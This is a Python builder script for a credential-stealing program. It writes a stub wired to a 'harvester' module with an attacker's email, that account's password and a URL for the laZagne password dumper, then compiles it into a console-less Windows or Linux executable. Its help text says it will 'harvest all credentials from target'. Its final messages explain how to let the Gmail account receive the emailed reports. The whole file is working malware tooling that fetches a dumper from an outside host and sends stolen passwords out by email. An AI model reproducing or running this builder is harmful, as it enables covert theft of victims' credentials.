#!/usr/bin/env python
import argparse
import subprocess
import os

WINDOWS_PYTHON_INTERPRETER_PATH = os.path.expanduser("~/.wine/drive_c/Python27/Scripts/pyinstaller.exe")

def get_arguments():
    parser = argparse.ArgumentParser(description="Harvest all credentials from target.")
    parser._optionals.title = "Optional Arguments"
    parser.add_argument("-w", "--windows", dest="windows", help="Generate a Windows executable.", action='store_true')
    parser.add_argument("-l", "--linux", dest="linux", help="Generate a Linux executable.", action='store_true')

    required_arguments = parser.add_argument_group('Required Arguments')
    required_arguments.add_argument("-e", "--email", dest="email", help="Email address to send reports to.")
    required_arguments.add_argument("-p", "--password", dest="password", help="Password for given email address.")
    required_arguments.add_argument("-u", "--url", dest="url", help="Absolute URL to laZagne exe.")
    required_arguments.add_argument("-o", "--out", dest="file_name", help="Output file name.", required=True)
    return parser.parse_args()

def write_harvester(file_name, email, password, url):
    with open(file_name, "w+") as file:
        file.write("import harvester\n")  
        file.write("harvester = harvester.Harvester('" + email + "','" + password + "','" + url + "')\n")
        file.write("harvester.start()\n")

def compile_for_windows(file_name):
    subprocess.call(["wine", WINDOWS_PYTHON_INTERPRETER_PATH, "--onefile", "--noconsole", file_name])

def compile_for_linux(file_name):
    subprocess.call(["pyinstaller", "--onefile", "--noconsole", file_name])

arguments = get_arguments()
write_harvester(arguments.file_name, arguments.email, arguments.password, arguments.url)

if (arguments.windows):
    compile_for_windows(arguments.file_name)

if (arguments.linux):
    compile_for_linux(arguments.file_name)

print("\n[+] Compilation complete.")
print("[*] You must allow less secure applications in provided Gmail account.")
print("[*] Do so here: https://myaccount.google.com/lesssecureapps")